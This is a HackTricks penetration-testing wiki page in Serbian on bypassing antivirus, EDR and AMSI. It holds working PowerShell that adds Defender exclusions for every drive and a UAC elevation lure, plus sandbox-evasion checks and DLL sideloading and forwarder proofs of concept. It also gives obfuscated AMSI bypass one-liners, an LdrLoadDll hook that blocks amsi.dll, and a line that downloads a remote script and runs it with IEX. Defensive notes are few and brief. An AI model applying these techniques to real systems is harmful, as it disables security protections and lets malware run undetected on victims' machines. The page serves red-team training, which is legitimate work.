# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a uz lažno predstavljanje drugog AV-a.
- [Onemogućavanje Defender-a ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalacionog programa pre menjanja Defender-a

Javni loader-i koji se predstavljaju kao game cheat-ovi često se isporučuju kao nepotpisani Node.js/Nexe instalacioni programi koji prvo **traže od korisnika povišene privilegije**, a tek onda onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada korisnik ima administratorska prava, pa neuspeh znači da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite sam program pomoću glagola `RunAs` da biste pokrenuli očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „krekovan“ softver, pa obično prihvate upit, čime malveru daju prava potrebna da izmeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Sveobuhvatna `MpPreference` izuzeća za svako slovo diska

Kada dobije povišene privilegije, lanci poput GachiLoader-a maksimalno iskorišćavaju slepe tačke Defender-a umesto da potpuno onemoguće uslugu. Loader prvo zaustavlja GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi svaki korisnički profil, sistemski direktorijum i prenosivi disk postali nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload smešten bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` služi za buduće potrebe — napadači zadržavaju mogućnost da kasnije učitaju nepotpisane drajvere, bez ponovnog menjanja Defender-a.
- Sve izmene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci i dalje prisutni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedna Defender usluga ne zaustavlja, naivne provere ispravnosti i dalje prijavljuju da je „antivirus aktivan“, iako inspekcija u realnom vremenu uopšte ne proverava te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion metodologija**

Trenutno AV rešenja koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR rešenja, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se sprovodi označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izvlačenjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do vašeg otkrivanja, jer su oni verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam biti potreban neki loader koji će dešifrovati program i pokrenuti ga u memoriji.

- **Obfuskacija**

Ponekad je dovoljno da promenite neke stringove u binarnoj datoteci ili skripti da biste je provukli pored AV-a, ali to može oduzeti dosta vremena, u zavisnosti od toga šta pokušavate da obfuskirate.

- **Pravljenje sopstvenih alata**

Ako razvijate sopstvene alate, neće postojati poznati loši potpisi, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru statičke detekcije Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata, a zatim traži od Defender-a da skenira svaki od njih pojedinačno. Tako vam može tačno pokazati koji su stringovi ili bajtovi u binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### Offline testovi PE karakteristika za statičke klasifikatore

Bajtovi upakovanog ili šifrovanog payload-a predstavljaju samo jedan od ulaza statičkog klasifikatora. EMBER2024 izvlači PE karakteristike, uključujući imports, exports, sekcije, zaglavlja i Authenticode podatke.<sup>[[48]](#references)</sup> U jednom eksperimentu sa loader-om, dodavanje 141 import-a koji su delovali bezopasno smanjilo je zlonamerni skor EMBER2024 modela za 93%, dok su import-i povezani sa malverom povećali skor. Ovo je rezultat za taj model i te uzorke, a ne pouzdan način zaobilaženja konkretnog AV/EDR proizvoda.<sup>[[50]](#references)</sup>

Za ovlašćeno testiranje loader-a, ostavite payload i putanju izvršavanja nepromenjenim, menjajte po jednu željenu promenljivu build-a po varijanti i uporedite skorove van mreže. Pregledajte dobijene PE karakteristike jer promena build-a može uticati na više grupa karakteristika.<sup>[[49]](#references)[[50]](#references)</sup> Da bi željeni import-i ostali u IAT-u, pozovite izabrane Win32 API-je iz dostupnog koda. Menjajte izbor i raspoređujte mesta poziva između build-ova, umesto da pravite fiksnu funkciju za kamuflažu koja može postati potpis. U eksperimentu su zabeleženi i niži skorovi uz važeće potpisivanje koda, stavke za export i veći broj funkcija koje uvećavaju `.pdata`; nevažeće potpisivanje imalo je mali uticaj, a efekat `.pdata` bio je neznatan.<sup>[[50]](#references)</sup>

Paket `thrember` omogućava izdvajanje karakteristika i korišćenje benchmark modela. Nakon instalacije, pokrenite `thrember.download_models("models")` sa postojećim direktorijumom `models`, a zatim pokrenite scorer iz njegovog nadređenog direktorijuma: pomoćna funkcija za preuzimanje menja trenutni radni direktorijum. PE klasifikator može da izračuna skor za direktorijum sa build-ovima, bez njihovog slanja servisu za skeniranje:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Tokom poređenja zadržite iste verzije modela i ekstraktora karakteristika. Niži offline rezultat samo pokazuje kako ovaj klasifikator reaguje na izmenjeni binarni fajl; ne dokazuje izbegavanje bihevioralne analize, emulacije ili drugačijeg modela nekog dobavljača.<sup>[[49]](#references)[[50]](#references)</sup> Za [polimorfizam po verziji i kamuflažu spoljnog binarnog fajla u virtuelizovanim payload-ima](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), pogledajte zaseban model izvršavanja.

### **Dinamička analiza**

Dinamička analiza je kada AV pokrene vaš binarni fajl u sandbox-u i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a za LSASS itd.). Ovaj deo može biti malo nezgodniji, ali evo nekoliko stvari koje možete da uradite kako biste izbegli sandbox-e.

- **Sačekajte pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje AV dinamičke analize. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekidali korisnikov radni tok, pa duga čekanja mogu da ometaju analizu binarnih fajlova. Problem je u tome što mnogi AV sandbox-i mogu jednostavno da preskoče čekanje, u zavisnosti od načina implementacije.
- **Proveravanje resursa računara** Sandbox-i obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore računar korisnika. Ovde možete biti i veoma kreativni, na primer, proveravanjem temperature CPU-a ili čak brzine ventilatora; ne implementira se sve u sandbox-u.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara i utvrditi da li se poklapa sa navedenim. Ako se ne poklapa, možete naterati program da se zatvori.

Ispostavlja se da je ime računara u Microsoft Defender Sandbox-u HAL9TH, pa možete proveriti ime računara u svom malware-u pre detonacije. Ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender-ovog sandbox-a, pa možete naterati program da se zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandbox-ima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom tekstu, **javni alati** će pre ili kasnije **biti detektovani**, pa bi trebalo da se zapitate sledeće:

Na primer, ako želite da napravite dump za LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki drugi, manje poznat projekat koji takođe pravi dump za LSASS?

Verovatno je ovo drugo pravi odgovor. Uzmimo mimikatz kao primer: verovatno je jedan od najčešće označenih, ako ne i najčešće označeni malware od strane AV-ova i EDR-ova. Iako je sam projekat izuzetno zanimljiv, njegovo korišćenje za zaobilaženje AV-ova predstavlja pravu noćnu moru, zato potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defender-u i, molimo vas, ozbiljno, **NEMOJTE OTPREMATI FAJLOVE NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je to moguće, uvek **dajte prednost korišćenju DLL-ova radi izbegavanja detekcije**. Prema mom iskustvu, DLL fajlovi se obično **mnogo ređe detektuju** i analiziraju, pa je ovo vrlo jednostavan trik koji u nekim slučajevima može da pomogne u izbegavanju detekcije (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo da vidimo na ovoj slici, DLL Payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje normalnog Havoc EXE payload-a i normalnog Havoc DLL-a na antiscan.me</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete da koristite sa DLL fajlovima kako biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL-ova koji koristi loader tako što postavlja i aplikaciju žrtve i zlonamerne payload-e jedne pored drugih.

Možete da potražite programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće powershell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa podložnih DLL hijacking-u unutar „C:\Program Files\\“ i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite programe podložne DLL Hijack/Sideload tehnici**; ova tehnika je prilično stealthy kada se pravilno primeni, ali ako koristite javno poznate programe podložne DLL Sideload tehnici, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/).

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je to uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), da biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarderi“: umesto da upućuje na kod, stavka izvoza sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno ponašanje koje treba razumeti:
- Ako je `TargetDll` KnownDLL, preuzima se iz zaštićenog KnownDLLs prostora imena (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja razrešavanje prosleđivanja.

Ovo omogućava indirektnu primitivu za sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu koji nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđeni izvoz, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen u Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi uobičajenim redosledom pretrage.

PoC (kopiraj i nalepi):
1) Kopirajte potpisani sistemski DLL u fasciklu u koju može da se upisuje
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamernu datoteku `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokreni prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok razrešava `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što se `DllMain` već izvrši

Saveti za traženje:
- Usredsredite se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli potencijalne kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozorite na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` izvan sistemskih putanja → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite pravila integriteta koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je skup alata za payload za zaobilaženje EDR-ova pomoću suspendovanih procesa, direktnih sistemskih poziva i alternativnih metoda izvršavanja`

Možete koristiti Freeze za učitavanje i izvršavanje shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je igra mačke i miša: ono što radi danas može biti otkriveno sutra, zato se nikad ne oslanjajte samo na jedan alat; ako je moguće, pokušajte da povežete više tehnika evazije.

## Direct/Indirect Syscalls i SSN rezolucija (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stubove. Da biste zaobišli te hookove, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode, bez izvršavanja hookovanog export entrypointa.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje instrukciju `syscall`/`sysenter`/`SVC #0` u generisani stub (ne pristupa se `ntdll` exportu).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za evaziju heurističkoj detekciji); **randomized indirect** bira gadget iz skupa za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; pronalazi syscall niz tokom izvršavanja.

**Strategije za hook-resistant SSN rezoluciju:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtualnoj adresi, umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira čistu datoteku `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog odeljka `.text`, pa je odmapira (zaobilazi sve hookove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-ova sortiranjem po VA sa proverom opcode-ova kada je stub čist; ako je hookovan, koristi zaključivanje na osnovu VA.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez parsiranja hookovanih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malver bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)”. U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa AV nije mogao ništa da uradi kako bi sprečio izvršavanje payload-a **direktno u memoriji**, jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u sledeće Windows komponente.

- Kontrola korisničkog naloga ili UAC (povišavanje privilegija za EXE, COM, MSI ili ActiveX instalaciju)
- PowerShell (skripte, interaktivna upotreba i dinamička procena koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje prefiks `amsi:`, a zatim putanju do izvršne datoteke iz koje je skripta pokrenuta; u ovom slučaju, powershell.exe

Nismo zapisali nijednu datoteku na disk, ali nas je AMSI ipak otkrio u memoriji.

Pored toga, počevši od verzije **.NET 4.8**, C# kod se takođe proverava preko AMSI-ja. To utiče čak i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuje upotreba starijih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto se AMSI uglavnom oslanja na statičke detekcije, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da deobfuskuje skripte čak i kada imaju više slojeva, pa obfuscation može biti loša opcija, u zavisnosti od načina na koji je izvedena. Zbog toga izbegavanje detekcije nije sasvim jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće je lako manipulisati njime čak i sa neprivilegovanog korisničkog naloga. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Forcing an Error**

Ako se inicijalizacija AMSI-ja prinudno ne uspe (`amsiInitFailed`), skeniranje se neće pokrenuti za trenutni proces. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu ove metode.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je dovoljna jedna linija PowerShell koda da AMSI učini neupotrebljivim za trenutni PowerShell proces. AMSI je, naravno, detektovao ovu liniju, pa je potrebno izmeniti je da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno čim objavite ovu objavu, zato nemojte objavljivati kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (odgovorne za skeniranje ulaza koji je uneo korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod E_INVALIDARG. Tako će rezultat stvarnog skeniranja biti 0, što se tumači kao čist rezultat.

> [!TIP]
> Za detaljnije objašnjenje pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću PowerShell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Preusmeravanje AMSI COM pokazivača za skeniranje umesto zakrpljivanja `AmsiScanBuffer`

Druga zaobilazna tehnika, lokalna za proces, ne dira ulaznu tačku `AmsiScanBuffer`. U opisanom 64-bitnom .NET loader-u kreira se AMSI COM objekat pomoću CLSID-ja `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` vraća pokazivač na interfejs, a slot njegove vtable na pomeraju `0x18` koristi se kao odredište poziva za skeniranje. Loader zakrpljuje nativni pokazivač za `Console.Clear()` kratkim x64 stub-om, menja taj unos vtable tako da pokazuje na stub pomoću `VirtualProtect()`, a zatim vraća prvobitnu zaštitu stranice. Neophodni preduslovi su 64-bitna širina pokazivača i očekivani COM raspored; ovo nije univerzalni pomeraj za proizvoljne AMSI interfejse ili build-ove. Ranije uočene faze su [učitavanje potpisanog AppDomainManager sidecar-a](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) i [RESX deserializacija](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Uočeni bajtovi stub-a su `41 C7 00 01 00 00 00 33 C0 C3`: oni upisuju **1** u pokazivač na rezultat u `r8` i vraćaju **0** u `eax`. Prema tome, tvrdnja u opisu da je rezultat skeniranja `AMSI_RESULT_CLEAN` (0) meša povratnu vrednost `S_OK` sa izlaznom enumeracijom. Prema dokumentovanom redosledu `AMSI_RESULT`, rezultat **1** je `AMSI_RESULT_NOT_DETECTED`; i dalje je ispod praga detekcije.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robusna zaobilazna tehnika, nezavisna od jezika, jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i u tom procesu se ne obavljaju skeniranja.<sup>[[23]](#references)</sup>

Okvirni prikaz implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi u PowerShell-u, WScript/CScript-u i prilagođenim loader-ima (sa svime što bi inače učitalo AMSI).
- Uparite ga sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke tragove u komandnoj liniji.
- Primećeno je da ga koriste loader-i pokrenuti preko LOLBins-a (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja, koja izbegava signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza sa znakovima, i nasumično menja velika i mala slova u PowerShell ključnim rečima kako bi izbegao signature.

**Uklonite detektovanu signaturu**

Možete da koristite alate kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovanu AMSI signaturu iz memorije trenutnog procesa. Ovaj alat radi tako što pretražuje memoriju trenutnog procesa u potrazi za AMSI signaturom, a zatim je prepisuje NOP instrukcijama, čime je efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

